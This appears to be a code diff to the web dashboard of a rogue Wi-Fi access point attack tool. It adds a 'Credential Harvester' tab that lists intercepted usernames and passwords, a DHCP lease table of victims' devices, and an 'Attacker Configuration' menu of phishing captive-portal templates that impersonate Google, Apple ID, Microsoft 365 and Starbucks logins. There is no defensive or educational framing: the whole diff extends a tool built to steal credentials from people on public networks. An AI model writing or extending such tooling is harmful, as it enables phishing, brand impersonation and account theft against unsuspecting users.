@@ -11,6 +11,8 @@
     <div class="tab active" onclick="switchTab('overview')">Overview</div>
     <div class="tab" onclick="switchTab('scanner')">Network Scanner</div>
     <div class="tab" onclick="switchTab('clients')">Active Clients</div>
+    <div class="tab" onclick="switchTab('harvester')" style="color:var(--warning)">Credential Harvester</div>
+    <div class="tab" onclick="switchTab('settings')"><i class="fas fa-cog"></i> Settings</div>
 </div>
 
 <div id="overview-tab" class="tab-content active">
@@ -59,9 +61,14 @@
     <div class="card">
         <div style="display:flex; justify-content:space-between; align-items:center;">
             <h3>Nearby Access Points</h3>
-            <button class="btn btn-primary" onclick="startScan()" id="scan-btn">
-                <i class="fas fa-search"></i> Start Survey
-            </button>
+            <div class="button-group">
+                <button class="btn btn-primary" onclick="toggleScan('start')" id="scan-start-btn">
+                    <i class="fas fa-play"></i> Start Auto-Scan
+                </button>
+                <button class="btn btn-danger" onclick="toggleScan('stop')" id="scan-stop-btn" style="display:none">
+                    <i class="fas fa-stop"></i> Stop Auto-Scan
+                </button>
+            </div>
         </div>
         <table class="data-table">
             <thead>
@@ -81,7 +88,7 @@
 </div>
 
 <div id="clients-tab" class="tab-content">
-    <div class="card">
+    <div class="card" style="margin-bottom: 30px;">
         <h3>Connected Devices</h3>
         <table class="data-table">
             <thead>
@@ -97,11 +104,69 @@
             </tbody>
         </table>
     </div>
+
+    <div class="card">
+        <h3>DHCP Leases</h3>
+        <table class="data-table">
+            <thead>
+                <tr>
+                    <th>Timestamp</th>
+                    <th>MAC</th>
+                    <th>Assigned IP</th>
+                    <th>Hostname</th>
+                </tr>
+            </thead>
+            <tbody id="lease-list">
+                <!-- Lease list here -->
+            </tbody>
+        </table>
+    </div>
+</div>
+
+<div id="harvester-tab" class="tab-content">
+    <div class="card">
+        <h3>Intercepted Credentials</h3>
+        <p class="subtitle" style="margin-bottom:20px">Real-time phishing data acquisition</p>
+        <div id="credential-feed">
+            <!-- Credentials here -->
+        </div>
+    </div>
+</div>
+
+<div id="settings-tab" class="tab-content">
+    <div class="card">
+        <h3>Attacker Configuration</h3>
+        <p class="subtitle">Customize your deployment parameters</p>
+        
+        <div style="margin-top:25px">
+            <label style="display:block; margin-bottom:10px; color:var(--text-secondary)">Active Phishing Template</label>
+            <select class="btn" style="background:rgba(255,255,255,0.05); color:white; border:1px solid rgba(255,255,255,0.1); width:100%; text-align:left; padding:12px" onchange="updatePortal(this.value)">
+                <option value="Standard Login">Standard Generic Login</option>
+                <option value="Google OAuth">Google OAuth Proxy</option>
+                <option value="Starbucks WiFi">Starbucks Reward Portal</option>
+                <option value="Apple ID">Apple ID Verification</option>
+                <option value="Microsoft 365">Microsoft 365 Login</option>
+            </select>
+            <p style="font-size:12px; color:var(--text-secondary); margin-top:8px">Select the captive portal template served to clients on the rogue AP.</p>
+        </div>
+    </div>
 </div>
 {% endblock %}
 
 {% block scripts %}
 <script>
+    async function updatePortal(val) {
+        await fetch('{% url "update_settings" %}', {
+            method: 'POST',
+            headers: { 
+                'Content-Type': 'application/json',
+                'X-CSRFToken': csrftoken 
+            },
+            body: JSON.stringify({ portal: val })
+        });
+        alert('Phishing template updated: ' + val);
+    }
+
     async function handleAttack(action) {
         const url = action === 'start' ? '{% url "start_attack" %}' : '{% url "stop_attack" %}';
         try {
@@ -154,19 +219,27 @@
         document.getElementById(tabId + '-tab').classList.add('active');
     }
 
-    async function startScan() {
-        const btn = document.getElementById('scan-btn');
-        btn.disabled = true;
-        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Scanning...';
+    async function toggleScan(action) {
+        document.getElementById('scan-start-btn').style.display = action === 'start' ? 'none' : 'inline-flex';
+        document.getElementById('scan-stop-btn').style.display = action === 'start' ? 'inline-flex' : 'none';
         
-        try {
-            await fetch('{% url "scan_networks" %}', {
-                method: 'POST',
-                headers: { 'X-CSRFToken': csrftoken }
-            });
-            setTimeout(pollScanResults, 3500);
-        } catch (e) { console.error(e); }
+        await fetch('{% url "scan_networks" %}', {
+            method: 'POST',
+            headers: { 
+                'Content-Type': 'application/json',
+                'X-CSRFToken': csrftoken 
+            },
+            body: JSON.stringify({ action: action })
+        });
+        
+        if (action === 'start') {
+            scanInterval = setInterval(pollScanResults, 5000);
+        } else {
+            clearInterval(scanInterval);
+        }
     }
+
+    let scanInterval;
 
     async function pollScanResults() {
         const resp = await fetch('{% url "scan_networks" %}');
@@ -188,27 +261,46 @@
             `;
             tbody.appendChild(row);
         });
-        
-        const btn = document.getElementById('scan-btn');
-        btn.disabled = false;
-        btn.innerHTML = '<i class="fas fa-search"></i> Start Survey';
     }
 
     async function fetchClients() {
         const resp = await fetch('{% url "get_clients" %}');
         const data = await resp.json();
-        const tbody = document.getElementById('client-list');
-        tbody.innerHTML = '';
         
+        // Clients
+        const cTbody = document.getElementById('client-list');
+        cTbody.innerHTML = '';
         data.clients.forEach(client => {
             const row = document.createElement('tr');
-            row.innerHTML = `
-                <td>${client.mac}</td>
-                <td>${client.ip}</td>
-                <td>${client.vendor}</td>
-                <td>${client.first_seen}</td>
+            row.innerHTML = `<td>${client.mac}</td><td>${client.ip}</td><td>${client.vendor}</td><td>${client.first_seen}</td>`;
+            cTbody.appendChild(row);
+        });
+
+        // Leases
+        const lTbody = document.getElementById('lease-list');
+        lTbody.innerHTML = '';
+        data.leases.forEach(lease => {
+            const row = document.createElement('tr');
+            row.innerHTML = `<td>${lease.timestamp}</td><td>${lease.mac}</td><td>${lease.ip}</td><td>${lease.hostname}</td>`;
+            lTbody.appendChild(row);
+        });
+
+        // Credentials
+        const cFeed = document.getElementById('credential-feed');
+        cFeed.innerHTML = '';
+        data.credentials.forEach(cred => {
+            const entry = document.createElement('div');
+            entry.className = 'cred-card';
+            entry.innerHTML = `
+                <div style="display:flex; justify-content:space-between; margin-bottom:10px;">
+                    <span class="badge badge-warning">${cred.service}</span>
+                    <span style="font-size:12px; color:var(--text-secondary)">${cred.timestamp}</span>
+                </div>
+                <div>Target: <span style="font-family:monospace">${cred.target}</span></div>
+                <div class="cred-user">User: ${cred.user}</div>
+                <div class="cred-pass">Pass: ${cred.pass}</div>
             `;
-            tbody.appendChild(row);
+            cFeed.appendChild(entry);
         });
     }
 
